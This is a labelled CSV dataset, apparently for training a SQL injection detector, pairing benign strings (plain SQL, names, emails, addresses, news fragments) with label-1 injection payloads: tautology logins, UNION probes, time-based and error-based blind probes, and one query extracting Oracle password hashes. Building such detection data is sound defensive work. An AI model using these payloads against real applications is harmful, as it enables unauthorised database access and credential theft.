Query,Label
SELECT * FROM team WHERE tax BETWEEN '1996-07-01' AND '1996-07-31',0
hoyo higueron 32 3-f,0
select * from users where id = 1 +$+. or 1 = 1 -- 1,1
violette,0
35715294c,0
They drove away,0
SELECT * FROM merely,0
f8av2,0
SELECT night ( s )  FROM notice UNION,0
"1  )  )   and elt ( 9288 = 6067,6067 )  and   (  (  1895 = 1895",1
"1%""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,1
"select * from users where id = '1' or \<$ union select 1,@@VERSION -- 1'",1
"1""  )   where 5129  =  5129 order by 1--",1
2689,0
"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and ""wrbs"" like ""wrbs",1
"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",1
6i4t562e7a,0
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'zaes'  =  'zaes,1
SELECT * FROM glass  WHERE sat = blanket,0
shukuri@velaconsultores.nl,0
bienia,0
"c/ misericordia, 57 7-h",0
He spared driving ban account special circumstances - spared fine,0
"1 )  as guru where 7615 = 7615 union all select null,null,null,null,null,null,null,null,null,null#",1
angold@callofduty6.nu,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28072 )  ORDER BY meta_id ASC",0
sims,0
"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'nelb' = 'nelb",1
"SELECT typical,look,shells FROM below LEFT JOIN Orders ON border.moodID =  accurate.although ORDER BY studying.purpose",0
-2992%'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',1
SELECT * FROM  ( SELECT tight FROM leader ),0
SELECT * FROM nest WHERE attack = 'paper',0
3905556905973113,0
"1"" )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( ""tlpw"" = ""tlpw",1
"However , reason desire move arachnophobia , rather fear able manage large number steps house , inside home old age , explained",0
SELECT team ( s FROM though RIGHT JOIN,0
"1""  )  )   or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (  ""zlwb"" = ""zlwb",1
"-4828'+  (  select qxnw where 9488  =  9488 union all select 9488,9488--",1
lovas@djbroadcast.bn,0
76951358m,0
SELECT column_name ( s ) FROM table1LEFT JOIN,0
baxie,0
"On last weekend August , Vogtsbauernhof Black Forest Open Air Museum Gutach near Hornberg firmly hands children",0
"SELECT * FROM egg WHERE express IN  ( 'correctly', 'fur', 'car' )",0
SELECT * FROM animal WHERE deer = 'announced'  AND  ( top = 'struggle' OR mile = 'living' ),0
"carretera estacion, 144, 8-d",0
37500,0
"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",1
"But opening statement Commission said &quot; never dealt incident child sexual assault within organisation , &quot; Commission told",0
DELETE FROM also WHERE noon = 'height',0
"SELECT DAYOFYEAR ( ""2017-01-01"" ) ;",0
cristy,0
SELECT * FROM women 3 SELECT * FROM place,0
"1%' )  and make_set ( 8403 = 8403,8899 )  and  ( '%' = '",1
SELECT interest FROM blow,0
"1' in boolean mode )  union all select null,null,null#",1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )  ||'",1
"-5625"" union all select 6087,6087,6087,6087,6087,6087--",1
lindt38,0
moriyama,0
sookdeo,0
tindall-bourne@pintandomucho.cg,0
4638,0
SELECT noon ( s FROM came RIGHT JOIN,0
"-2782'  )  )   or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
"1' in boolean mode  )   and make_set  (  7804  =  3315,3315  )  #",1
"1%""  )  )   )  and make_set ( 8403 = 8403,8899 )  and   (  (   ( ""%"" = """,1
cabr,0
select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,1
bethania,0
con10e4t2,0
50690,0
"1"" where 3484  =  3484 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
select   (  case when   (  2394  =  4530  )   then 2394 else 2394*  (  select 2394 from information_schema.character_sets  )   end  )  #,1
r2s058ada,0
"-4807' where 3232 = 3232 or make_set ( 6599 = 5179,5179 ) --",1
"SELECT Orders.unlessrID, Employees.shown, Employees.teach FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.slightID ORDER BY Orders.tonightID",0
SELECT COUNT ( naturally ) FROM camera,0
01472954b,0
57738017j,0
Trainer Tomasz Malmon let doubt fact,0
Pamela Anderson latest celebrity shock fans dramatic new hairdo,0
1   )    )    as eigk where 2557  =  2557,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'nhuk'  =  'nhuk",1
48549953n,0
They produced hard-fought two-hour match,0
uytterlinden@lamolahotel.ro,0
SELECT AVG ( Price ) FROM compare,0
-4171'  )   union all select 6136#,1
cribada,0
"1"" union all select null,null,null,null,null,null,null#",1
4436070000000000,0
"SELECT * FROM average ORDER BY sure, find",0
trung,0
SELECT COUNT ( DISTINCT dried )  FROM put,0
"1""   )    )    as casz where 5921  =  5921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
"1%' and elt  (  4249  =  4249,7259  )   and '%'  =  '",1
"1' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'qdij'  =  'qdij",1
4e7cr0b37,0
48042322z,0
FROM  ( SELECT DISTINCT any FROM ability ),0
-6397%' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',1
"1  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 9558 = 9558",1
francisk,0
SELECT * FROM piece WHERE raw = 'wide'  AND  ( brass = 'hat' OR newspaper = 'understanding' ),0
admin' or 1 = 1/*,1
"1""  )   where 4382  =  4382 and 6607  =  2394--",1
1  )  )   as emtf where 3561 = 3561 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) --,1
"-9959"" )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( ""vcwc"" = ""vcwc",1
ergo226825e,0
"1 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) -- ivku",1
"1""  )   as tnux where 4888  =  4888 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
"select * from users where id = 1 or @#""; = 1 or 1 = 1 -- 1",1
7688145682842926,0
37170,0
49322,0
select name from syscolumns where id   =     (  sele ...,1
"Perhaps crazy , perhaps drugs affected brain",0
9270844246904218,0
"The German property markets benefiting country &apos;s economic strength general conditions , compared rest Europe , competitive",0
SELECT * FROM flag WHERE thrown = 'hour'  AND  ( heart = 'spell' OR open = 'massage' ),0
7529,0
butjosa,0
birgel_pusith@hojainformativas.com.nu,0
"SELECT COUNT ( coal ) , sink FROM act BY several",0
55,0
Both communities thus mentioned deed,0
2es8i1g73,0
"c/ altamira 179,",0
villanueva de jiloca,0
"-7831""   )    )    as krzi where 3798  =  3798 order by 1--",1
"select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1
SELECT occasionally ( s )  FROM mighty,0
1'  )  )   as xpmy where 5274 = 5274 rlike  ( select  ( case when  ( 6252 = 7704 )  then 1 else 0x28 end  )  )  --,1
"Danielle Ockwell , supervised Lord asked child protection training concerned behaviour , testified found YMCA Caringbah children &apos;s services manager Jacqui Barnat supervised Lord &quot; intimidating hard approach lot time",0
huston,0
vallibona,0
al9ol,0
"In developments , Observatory &apos;s chief Rami Abdurrahman said strong explosion Wednesday inside air defense facility Syria &apos;s coastal province Latakia",0
SELECT TOP 50 PERCENT * FROM enter SELECT * FROM soldier FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM property,0
-3559'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ),1
halbert,0
DELETE FROM shinning,0
1 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) # ewsz,1
flury,0
28011073v,0
8000,0
create user name identified by 'pass123',1
81208495a,0
161que,0
"The Board Directors gave special thanks team managed innkeeper , Ange Pier-Ribbert , delighted present top class menu , Gerda Pier-Ribbert table decorations",0
"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",1
&quot; It seems bird became exhausted managed find refuge oil rig,0
81470918l,0
mary wellstone craf 117 13-f,0
SELECT * FROM country FETCH FIRST 3 ROWS ONLY,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4# ljph",1
2354,0
"-4983%""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1
sibirskaia@euskalcasino.es,0
admin' or 1  =  1--,1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and  ( 'xcnj' = 'xcnj",1
roccardi.betten@carrillo-de-albornoz.mil,0
knute,0
"-6600'  )   union all select 5566,5566#",1
SELECT tears FROM whistle,0
"1'+ ( select pdfv where 1172 = 1172 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161  )  )  +'",1
03134,0
Claims outage caused distributed denial service &#91; DDoS &#93; attack true,0
"SELECT further AS winter, middle AS [string]  FROM doubt",0
7aria22,0
cagarria,0
(  select   (  case when   (  1570  =  6977  )   then 1 else 1570*  (  select 1570 from mysql.db  )   end   )    ),1
0598963816827000,0
stalin,0
"calle s'arraval, 114",0
genny,0
"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
brunella,0
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'xtdj'  =  'xtdj",1
adriana,0
"Jim Snabe , co-chief executive SAP , says: &quot; We see new question customers &apos;t come year ago - data stored guarantee stays physically jurisdiction",0
"1   )    )    union all select null,null,null--",1
"1"" and make_set ( 8262 = 3471,3471 )  and ""wayp"" = ""wayp",1
40170,0
20709,0
"select * from users where id = 1 or ""%_"" or 1 = 1 -- 1",1
"1%""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""%""  =  """,1
grant@ubuybetter.yu,0
"c/ alqueria de rubiols, s/n, 11?d",0
galligan@bijoubijoudiferente.vg,0
"SELECT * FROM property ORDER BY characteristic ASC, sugar DESC",0
Wallis Simpson may intersex,0
"1""  )   where 3958  =  3958 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
isunza,0
"select * from users where id  =  1 or $ 1  =  1 union select 1,@@VERSION -- 1",1
46198,0
admin' )  or '1' = '1'/*,1
SELECT option_value FROM wp_options WHERE option_name  =  'kc_optimized' LIMIT 1,0
borox,0
-5286' or 6783  =  1233,1
"Trekking mud , rivers jungle provide free medical care Dr",0
"Late Thursday evening , fire broke ground floor house",0
"-1413"" )  union all select 6651,6651,6651--",1
duilio,0
"SELECT DATEDIFF ( ""2017-01-01"",   ""2016-12-24"" ) ;",0
"The government Jerusalem fails confirm attack Syrian airforce base On Thursday , American government official , wished remain anonymous , made statement American news broadcaster CNN , stating Israeli fighter planes attacked airforce base Syrian town Latakia day",0
8589,0
"1' where 9420  =  9420 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT CURRENT_TIMESTAMP (  ),0
4092441841924319,0
"1 )  where 8164 = 8164 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
SELECT hunt FROM twenty,0
?,1
kitaen5@lawn.vn,0
"1%"" or sleep  (  5  )   and ""%""  =  """,1
"1'+ ( select 'ayod' where 7839 = 7839 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )    )  )  +'",1
-4325 order by 1--,1
pianka@noviasteresapalacios.mc,0
"However , regard winning run , Rangnick sang team &apos;s praises",0
wolfs,0
cella,0
"Their motto , large billboard stated &quot; We unfinished buildings &quot;",0
waitfor delay '0:0:5' ) +',1
SELECT * FROM office FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM feel,0
"SELECT expect,thou,great FROM winter LEFT JOIN Orders ON forget.blockID =  gold.paid ORDER BY television.across",0
81,0
"select * from users where id = 1 or ""%1"" or 1 = 1 -- 1",1
"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and 'ozur' = 'ozur",1
SELECT option_value FROM wp_options WHERE option_name  =  'ReduxFrameworkPlugin' LIMIT 1,0
"-8868"" )  where 5681 = 5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--",1
1 where 4245  =  4245,1
1272,0
"1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
caleta,0
"SELECT chief AS half, sitting AS [bound]  FROM average",0
ann-margaret@indorec.pro,0
laurance@familiamarino.td,0
04644,0
SELECT AVG ( Price ) FROM task,0
SELECT COUNT ( diagram )  FROM longer,0
"SELECT point, man, pinkFROM jungle WHERE canal  IS NOT NULL",0
25307,0
"The jury heard Thursday Coulson confronted Mr Blunkett affair married woman seeing co-defendant Rebekah Brooks , married time",0
calle nicolas funes 116,0
harmony,0
"&quot; We address subject municipal rates , investments made coming years could subsidies , &quot; commented Gerster regarding matter",0
1656,0
3742884361976074,0
40027603j,0
"1%'  )  )   or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
DELETE FROM section WHERE underline = 'shoot',0
doretta5,0
The judge ruled police officers violated civil rights tens thousands people wrongly targeting black Hispanic men stop-and-frisk program,0
SELECT COUNT ( funny ) FROM damage,0
yan-zhen,0
pizani@unanuevavisionenortodoncia.tg,0
thirugna,0
SELECT MIN ( smell )  AS party FROM medicine,0
mallejac,0
"1%""  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (  ""%"" = """,1
"1'  )  )   and elt ( 4460 = 2665,2665 )  and   (  (  'qmzu' = 'qmzu",1
SELECT AVG ( caught ) FROM clean,0
49714,0
1' )  as twny where 9580 = 9580,1
"1'+  (  select sged where 1181  =  1181 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",1
05230,0
waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,1
"1%""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,1
"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",1
1'|| ( select 'bwqc' from dual where 6897 = 6897 and sleep ( 5 ) #,1
"-5062""  )  )   )  union all select 4125,4125--",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
1' )  as xbsc where 6772 = 6772,1
"The committee considers reconstruction &quot; Vor Heubach &quot; &apos; Vor Kuhbach &quot; railway crossings , crossing agreements already reached Deutsche Bahn , unproblematic",0
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'cbaj'  =  'cbaj,1
SELECT * FROM social WHERE headed NOT BETWEEN 'failed' AND 'clothing',0
sylvie@laspruebascongaseosa.pk,0
"1'||  (  select 'cozi' from dual where 2607  =  2607 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
-3450' where 4478  =  4478 or 9323  =  9323#,1
SELECT AVG ( duck )  FROM box  SELECT SUM ( triangle ),0
"SELECT worry AS your, floating AS [thee]  FROM muscle",0
dao,0
One major reason upcoming price increase rise so-called EEC Levy 5,0
-3613%' )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( '%' = ',1
36384,0
"1' in boolean mode  )   union all select null,null,null,null,null#",1
1' )  where 8163 = 8163,1
select * from users where id  =  1 or \+<\ or 1  =  1 -- 1,1
-2361'   )    )    as mzhv where 2905  =  2905 or 9026  =  5388--,1
ocaa,0
The viewer sees joints still carved hand,0
9661992110368091,0
1' where 4945 = 4945,1
4la3ue95,0
d.onofri,0
"-9507%"" union all select 3342,3342,3342,3342,3342#",1
SELECT AVG ( song ) FROM brown SELECT SUM ( better ),0
"1'   )    )    as xjen where 6791  =  6791 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
"Snowden referred complex legal situation , Ströbele said ARD &apos;s &quot; Panorama &quot; programme",0
a0_idia,0
-6529' )  or  ( 4309 = 1601 ) *1601,1
08394,0
arbeca,0
&quot; A tape voicemails taken phone least three occasions seized Mulcaire &apos;s home August 2006,0
intuitivo,0
"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",1
yee,0
repuesta,0
"SELECT * FROM solve ORDER BY more, terrible",0
"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'kufi'  =  'kufi",1
"UPDATE call SET member =  'fifteen', City =  'roar' WHERE first =  spend",0
"Renamo , pushing electoral reforms , already said would boycott municipal elections due November",0
cstaras,0
select * from users where id = 1 <@ or 1 = 1 -- 1,1
SELECT * FROM straight FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM travel,0
maccoll-stringer@programa-gestion-erp.nr,0
"1%' )  union all select null,null#",1
octagonal,0
disentrica,0
20268,0
"-2612"" )  as iwfj where 3231 = 3231 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --",1
1' )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ),1
